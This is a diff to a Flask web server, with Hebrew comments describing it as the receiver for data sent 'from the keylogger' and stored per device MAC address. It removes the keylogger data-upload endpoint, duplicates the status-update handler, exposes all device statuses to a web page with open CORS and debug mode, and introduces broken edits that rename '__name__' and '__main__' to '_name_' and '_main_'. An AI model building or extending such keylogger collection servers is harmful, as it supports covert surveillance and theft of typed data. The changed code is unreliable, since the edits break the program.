@@ -3,7 +3,7 @@ from flask_cors import CORS
 import json
 import os
 
-app = Flask(__name__)
+app = Flask(_name_)
 CORS(app)  # מאפשר בקשות מכל דומיין
 
 
@@ -41,7 +41,26 @@ def status_update():
         if not data:
             return jsonify({"error": "Invalid JSON"}), 400
 
-        mac_address = data.get("macAddress")
+        status = {"mac_address": data}
+        write_to_json("device_status", status)
+        print("📥 נתונים שהתקבלו:", data)
+        return jsonify({"message": "Success"}), 200
+    except Exception as e:
+        print("❌ שגיאה:", e)
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/api/status/update', methods=['POST'])
+def status_update():
+    print("/api/status/update")
+    """ מקבל נתוני סטטוס מהקיי לוגר ושומר בקובץ לפי כתובת ה-MAC """
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({"error": "Invalid JSON"}), 400
+
+        # תיקון שם המפתח ל-mac_address
+        mac_address = data.get("macAddress")  # שים לב למפתח הזה
         if not mac_address:
             return jsonify({"error": "Missing macAddress"}), 400
 
@@ -53,26 +72,6 @@ def status_update():
         print("❌ שגיאה:", e)
         return jsonify({"error": str(e)}), 500
 
-
-@app.route('/api/data/upload', methods=['POST'])
-def data_upload():
-    """ קבלת נתונים מהקיי לוגר ושמירתם לפי כתובת ה-MAC """
-    print("/api/data/upload")
-    try:
-        data = request.get_json()
-        if not data:
-            return jsonify({"error": "Invalid JSON"}), 400
-
-        mac_address = request.headers.get("mac_address")
-        if not mac_address:
-            return jsonify({"error": "Missing mac_address in headers"}), 400
-
-        write_to_json(mac_address, data)
-        print("📥 נתונים שהתקבלו:", data)
-        return jsonify({"message": "Success"}), 200
-    except Exception as e:
-        print("❌ שגיאה:", e)
-        return jsonify({"error": str(e)}), 500
 
 
 @app.route('/api/data/files', methods=['GET'])
@@ -99,6 +98,7 @@ def get_status_all():
     """ שליפת קובץ הסטטוסים של כל המכשירים המחוברים עבור הדף אינטרנט """
     print("/api/status/all")
     try:
+        # תיקון שם הקובץ
         with open("device_status.json", "r", encoding="utf-8") as file:
             data_json = json.load(file)
             print("📤 נתונים שנשלחו:", data_json)
@@ -159,6 +159,6 @@ def change_status():
         return jsonify({"error": str(e)}), 500
 
 
-if __name__ == '__main__':
+if _name_ == '_main_':
     port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=True)
+    app.run(host="0.0.0.0", port=port, debug=True)
